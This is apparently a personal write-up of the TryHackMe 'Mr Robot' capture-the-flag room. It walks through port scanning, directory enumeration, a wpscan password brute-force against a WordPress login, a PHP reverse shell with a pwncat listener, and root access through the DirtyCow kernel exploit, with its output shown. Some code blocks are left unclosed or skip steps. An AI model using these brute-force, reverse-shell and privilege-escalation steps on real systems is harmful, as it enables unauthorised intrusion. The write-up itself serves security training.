## Description

The Following Post is writeup of Mr RobotCTF room of tryhackme <https://tryhackme.com/room/mrrobot>

|Machine|Detail
|:---|:--
|OS | Linux
|Rating | Medium
|Creator | Leon Johnson

## Summary

The machine have 2 open ports 80 and 443. So basically there is webserver.
By Dirbusting the server we will get robots file and wp-login(wordpress).
In robots file we got a dictonary. BruteForce it against the login and then gain reverse shell.
We will get md5 hash or user robot, crack it and get the user. From user i found two ways.
There is dirty cow exploit and another is through nmap.

## Walkthrough

### Enumeration

```bash
‚îå‚îÄ[argenestel@parrot]‚îÄ[~/Desktop/tryhackme/robotctf]
‚îî‚îÄ‚îÄ‚ïº $nmap -sC -sV -oN nmap/robot 10.10.183.108
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-21 12:11 IST
Nmap scan report for 10.10.183.108
Host is up (0.30s latency).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.21 seconds
```

so from nmap scan we got two ports only
On checking 443 i didn't really get anything so i moved on to port 80

#### port 80

![Webpage](/assets/img/mrrobot/port80.png)

So we can see few links after the Webpage loaded.
Moving on to dirbust.

```bash
/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/video (Status: 301)
/feed (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)

/intro (Status: 200)
/wp-login (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/Image (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/dashboard (Status: 302)
```
![robots](/assets/img/mrrobot/fsocdic.png)

Okay so we have 1st flag and wordlist.

so we can see login too.

Hmm wordpress so we have dictonary we can BruteForce it.
Idk the username tbh it got me I was stuck here So i tried some common username and nothing worked.
Looking into some already made writeup make me realise that... Aw man I can BruteForce user too.
But Yeah the username was elliot so all i have to do is BruteForce for Password.

Upon checking the wordlist i found out there are 80,000+ lines.
Gonna take long man.
But see everything is repeated almost 8 times (Aw thats something bad).

```terminal
sort fsociety.dic |uniq > uniq.list
```

so i got ~11000 lines ahh not bad let's start wpscan.

#### Exploitation

so we are now going to upload a reverse shell.

```bash
‚îå‚îÄ[argenestel@parrot]‚îÄ[~/Desktop/tryhackme/robotctf]
‚îî‚îÄ‚îÄ‚ïº $wpscan --url http://mrrobot.thm -P uniq.list --usernames elliot

uploaded php shell let's execute it

we have pwncat listening.

```bash
‚îå‚îÄ[argenestel@parrot]‚îÄ[~/Desktop/tryhackme/robotctf]
‚îî‚îÄ‚îÄ‚ïº $pwncat --listen --port 1234

```
so we can crack the hash and get

#### PrivEsc

```bash
robot@linux:~$ id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@linux:~$
```

okay so got robot user.
since the kernel version was old i ran exploit suggester to find out exploit (from linpeas)

```bash
[+] [CVE-2016-5195] dirtycow

robot@linux:/tmp$ chmod 777 cowroot
robot@linux:/tmp$ ./cowroot
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 47032
Racing, this may take a while..
thread stopped

/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak

```

so i rooted using dirty cow but as we can see nmap is also there.

so rooting through nmap is also possible.
